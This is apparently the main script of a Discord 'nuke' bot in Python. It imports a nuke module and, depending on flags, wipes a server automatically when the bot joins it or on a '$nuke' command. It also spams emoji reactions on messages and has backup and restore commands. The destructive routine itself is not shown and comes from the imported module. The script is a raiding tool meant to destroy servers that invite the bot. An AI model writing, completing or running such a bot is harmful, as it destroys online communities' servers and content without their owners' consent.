import os
from nuke import *

token = os.getenv('token')
intents = discord.Intents.default()
intents.members, intents.message_content = True, True
client = discord.Client(intents=intents)


@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')


@client.event
async def on_message(message):
    if b_nuke_on_command and message.content.startswith('$nuke'):
        await nuke(message.channel.guild)
    if b_backup_on_command and message.content.startswith('$backup'):
        await backup(message.channel.guild)
    if b_restore_on_command and message.content.startswith('$restore'):
        await restore(message.channel.guild)

    if b_spam_reacts:
        reactions = ['😂', '🤐', '😏']
        for reaction in reactions:
            try:
                await message.add_reaction(reaction)
            except discord.errors.NotFound:
                return


@client.event
async def on_guild_join(guild):
    if b_backup_on_join:
        await backup(guild)
    if b_nuke_on_join:
        await nuke(guild)


if __name__ == '__main__':
    client.run(token=token)
